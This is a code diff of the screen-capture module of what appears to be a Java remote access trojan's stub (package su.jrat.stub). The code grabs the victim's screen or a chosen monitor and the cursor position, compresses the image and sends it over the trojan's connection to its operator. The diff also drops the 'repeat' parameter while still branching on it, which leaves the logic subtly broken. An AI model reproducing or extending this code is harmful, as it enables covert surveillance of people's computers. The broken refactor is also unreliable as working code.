@@ -16,10 +16,8 @@ import su.jrat.stub.packets.outgoing.Packet18OneRemoteScreen;
 import su.jrat.stub.packets.outgoing.Packet33Thumbnail;
 import su.jrat.stub.utils.ImageUtils;
 
-
 public class Screen implements Runnable {
 
-	public static boolean running;
 	public static Screen instance;
 
 	private boolean repeat;
@@ -27,9 +25,8 @@ public class Screen implements Runnable {
 	private int quality;
 	private int monitor;
 
-	public Screen(boolean repeat, int size, int quality, int monitor) {
+	public Screen(int size, int quality, int monitor) {
 		Screen.instance = this;
-		this.repeat = repeat;
 		this.size = size;
 		this.quality = quality;
 		this.monitor = monitor;
@@ -37,66 +34,58 @@ public class Screen implements Runnable {
 
 	@Override
 	public void run() {
-		if (repeat) {
-			running = true;
-		}
-		
-
 		try {
-			//do {
-				double scaledSize = size / 100D;
+			double scaledSize = size / 100D;
 
-				BufferedImage image;
-				Rectangle screenBounds;
+			BufferedImage image;
+			Rectangle screenBounds;
 
-				if (monitor == -1) {
-					Robot robot = new Robot();
-					screenBounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
-					image = robot.createScreenCapture(screenBounds);
-				} else {
-					GraphicsDevice screen = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()[monitor];
-					Robot robot = new Robot(screen);
-					screenBounds = screen.getDefaultConfiguration().getBounds();
-					screenBounds.x = 0;
-					screenBounds.y = 0;
-					image = robot.createScreenCapture(screenBounds);
-				}
-				
-				if (scaledSize == 0D) {
-					scaledSize = 0.1D;
-				}
+			if (monitor == -1) {
+				Robot robot = new Robot();
+				screenBounds = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+				image = robot.createScreenCapture(screenBounds);
+			} else {
+				GraphicsDevice screen = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices()[monitor];
+				Robot robot = new Robot(screen);
+				screenBounds = screen.getDefaultConfiguration().getBounds();
+				screenBounds.x = 0;
+				screenBounds.y = 0;
+				image = robot.createScreenCapture(screenBounds);
+			}
 
-				if (scaledSize != 1.0D) {
-					image = ImageUtils.resize(image, scaledSize);
-				}
+			if (scaledSize == 0D) {
+				scaledSize = 0.1D;
+			}
 
-				PointerInfo a = MouseInfo.getPointerInfo();
-				Point b = a.getLocation();
-				int x = (int) b.getX();
-				int y = (int) b.getY();
-				
-				int scaledWidth = (int) (x * scaledSize);
-				int scaledHeight = (int) (y * scaledSize);
-				
-				AbstractOutgoingPacket packet;
-				
-				byte[] array = ImageUtils.encode(image, (float) quality / 10F);
-				
-				System.out.println(array.length);
-				
-				if (repeat) {
-					packet = new Packet17RemoteScreen(array, scaledWidth, scaledHeight);
-				} else {
-					packet = new Packet18OneRemoteScreen(array, scaledWidth, scaledHeight);
-				}
-				
-				packet.send(Connection.dos, Connection.sw);
-			//} while (running && Connection.socket.isConnected());
+			if (scaledSize != 1.0D) {
+				image = ImageUtils.resize(image, scaledSize);
+			}
+
+			PointerInfo a = MouseInfo.getPointerInfo();
+			Point b = a.getLocation();
+			int x = (int) b.getX();
+			int y = (int) b.getY();
+
+			int scaledWidth = (int) (x * scaledSize);
+			int scaledHeight = (int) (y * scaledSize);
+
+			AbstractOutgoingPacket packet;
+
+			byte[] array = ImageUtils.encode(image, (float) quality / 10F);
+
+			System.out.println(array.length);
+
+			if (repeat) {
+				packet = new Packet17RemoteScreen(array, scaledWidth, scaledHeight);
+			} else {
+				packet = new Packet18OneRemoteScreen(array, scaledWidth, scaledHeight);
+			}
+
+			packet.send(Connection.dos, Connection.sw);
 		} catch (Exception ex) {
 			ex.printStackTrace();
 		}
-		
-		running = false;
+
 		instance = null;
 	}
 
